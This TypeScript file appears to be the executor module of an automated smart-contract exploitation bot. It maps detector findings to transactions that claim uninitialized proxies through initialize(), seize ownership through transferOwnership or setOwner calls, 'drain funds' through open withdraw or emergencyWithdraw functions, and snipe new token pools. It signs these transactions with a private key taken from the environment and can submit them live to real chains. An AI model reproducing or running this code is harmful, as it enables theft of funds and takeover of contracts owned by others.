import {
  createWalletClient,
  http,
  type PublicClient,
  type Chain,
  type Transport,
  type Account,
  type WalletClient,
  type SendTransactionParameters,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import type { PipelineResult } from "../detectors/pipeline.js";
import { shouldSnipe, buildSnipeTx } from "./strategies/snipe.js";

export interface ExecutionResult {
  action: string;
  txHash?: string;
  simulated: boolean;
  success: boolean;
  error?: string;
  gasEstimate?: bigint;
  value?: bigint;
}

type ActionBuilder = (result: PipelineResult) => {
  to: `0x${string}`;
  data: `0x${string}`;
  value?: bigint;
  description: string;
} | null;

// Map tags/meta to concrete transactions
const ACTION_BUILDERS: ActionBuilder[] = [
  // Pool snipe — buy into new token (placeholder address, rebuilt in execute())
  (result) => {
    if (!shouldSnipe(result)) return null;
    return buildSnipeTx(result, "0x0000000000000000000000000000000000000001");
  },


  // Uninitialized proxy — call initialize() to claim ownership
  (result) => {
    if (!result.tags.has("uninitialized")) return null;
    const sig = result.meta.callableInitializer as string | undefined;
    if (!sig) return null;

    // Find the selector from the initializer detector's data
    const selectorMap: Record<string, string> = {
      "initialize()": "8129fc1c",
      "initialize(address)": "c4d66de8",
      "initialize(address,address)": "485cc955",
      "initialize(address,address,address)": "f8c8765e",
      "initialize(address,address,address,address)": "1459457a",
      "initialize(uint256)": "fe4b84df",
    };

    const selector = selectorMap[sig];
    if (!selector) return null;

    // For initialize(address) variants, we pass our own address
    // This gets filled in at execution time with the wallet address
    const isNoArg = sig.endsWith("()");
    const argCount = isNoArg ? 0 : (sig.match(/,/g) || []).length + 1;

    return {
      to: result.contract.address,
      // Placeholder args — wallet address gets injected in execute()
      data: `0x${selector}${"0".repeat(64 * argCount)}` as `0x${string}`,
      description: `Claim uninitialized proxy via ${sig}`,
    };
  },

  // Claimable ownership — call transferOwnership/setOwner
  (result) => {
    if (!result.tags.has("claimable-ownership")) return null;
    const claimFn = result.meta.claimFunction as string | undefined;
    if (!claimFn) return null;

    const selectorMap: Record<string, string> = {
      "transferOwnership(address)": "f2fde38b",
      "setOwner(address)": "13af4035",
      "setGovernance(address)": "ab033ea9",
      "setAdmin(address)": "cfad57a2",
      "claimOwnership()": "79ba5097",
      "acceptOwnership()": "e30c3978",
    };

    const selector = selectorMap[claimFn];
    if (!selector) return null;

    const isNoArg = claimFn.endsWith("()");

    return {
      to: result.contract.address,
      data: `0x${selector}${isNoArg ? "" : "0".repeat(64)}` as `0x${string}`,
      description: `Claim ownership via ${claimFn}`,
    };
  },

  // Open withdrawal — drain funds
  (result) => {
    if (!result.tags.has("open-withdrawal")) return null;
    const fns = result.meta.openWithdrawalFunctions as string[] | undefined;
    if (!fns || fns.length === 0) return null;

    // Pick the first open function — prefer no-arg variants
    const noArgFn = fns.find((f) => f.endsWith("()"));
    const targetFn = noArgFn || fns[0];

    const selectorMap: Record<string, string> = {
      "withdraw()": "3ccfd60b",
      "emergencyWithdraw()": "db2e21bc",
      "drain()": "853828b6",
      "exit()": "e9fad8ee",
      "claimAll()": "7c4d82e5",
      "claim()": "4e71d92d",
    };

    // For no-arg, use direct selector; for others, pad with zeros
    const selector = selectorMap[targetFn];
    if (!selector) return null;

    return {
      to: result.contract.address,
      data: `0x${selector}` as `0x${string}`,
      description: `Drain via ${targetFn}`,
    };
  },
];

export class Executor {
  private account: Account | null = null;
  private dryRun: boolean;

  constructor() {
    this.dryRun = process.env.EXECUTOR_LIVE !== "true";

    const pk = process.env.EXECUTOR_PRIVATE_KEY;
    if (pk) {
      this.account = privateKeyToAccount(pk as `0x${string}`);
      console.log(`  Executor wallet: ${this.account.address}`);
    }

    console.log(`  Mode: ${this.dryRun ? "DRY RUN (simulation only)" : "LIVE"}`);
  }

  async execute(
    result: PipelineResult,
    client: PublicClient<Transport, Chain>
  ): Promise<ExecutionResult[]> {
    const results: ExecutionResult[] = [];

    for (let builder of ACTION_BUILDERS) {
      // For snipe actions, rebuild with real wallet address
      if (this.account && shouldSnipe(result)) {
        const snipeTx = buildSnipeTx(result, this.account.address);
        if (snipeTx) {
          builder = () => snipeTx;
        }
      }

      const action = builder(result);
      if (!action) continue;

      // Inject our wallet address into any address-type args (replace zero padding)
      let calldata = action.data;
      if (this.account && calldata.length > 10) {
        const addr = this.account.address.slice(2).toLowerCase().padStart(64, "0");
        calldata = calldata.replace("0".repeat(64), addr) as `0x${string}`;
      }

      // Simulate first
      try {
        const gasEstimate = await client.estimateGas({
          to: action.to,
          data: calldata,
          account: this.account?.address || "0x0000000000000000000000000000000000000001",
          value: action.value || 0n,
        });

        console.log(`\n  [EXECUTOR] ${action.description}`);
        console.log(`    Target:   ${action.to}`);
        console.log(`    Gas est:  ${gasEstimate}`);
        console.log(`    Chain:    ${result.contract.chain}`);

        if (this.dryRun || !this.account) {
          console.log(`    Status:   SIMULATED (dry run)`);
          results.push({
            action: action.description,
            simulated: true,
            success: true,
            gasEstimate,
          });
          continue;
        }

        // Live execution
        const walletClient = createWalletClient({
          account: this.account,
          chain: client.chain!,
          transport: http(process.env[`${result.contract.chain.toUpperCase()}_RPC_HTTP`] || undefined),
        });

        const txHash = await walletClient.sendTransaction({
          to: action.to,
          data: calldata,
          value: action.value || 0n,
          gas: gasEstimate * 120n / 100n, // 20% buffer
        });

        console.log(`    Status:   SUBMITTED`);
        console.log(`    Tx hash:  ${txHash}`);

        // Wait for receipt
        const receipt = await client.waitForTransactionReceipt({ hash: txHash });

        const success = receipt.status === "success";
        console.log(`    Result:   ${success ? "SUCCESS" : "REVERTED"}`);

        results.push({
          action: action.description,
          txHash,
          simulated: false,
          success,
        });
      } catch (err) {
        const message = err instanceof Error ? err.message : String(err);
        console.log(`\n  [EXECUTOR] ${action.description}`);
        console.log(`    Status:   FAILED (simulation reverted)`);
        console.log(`    Error:    ${message.slice(0, 200)}`);

        results.push({
          action: action.description,
          simulated: true,
          success: false,
          error: message,
        });
      }
    }

    return results;
  }
}
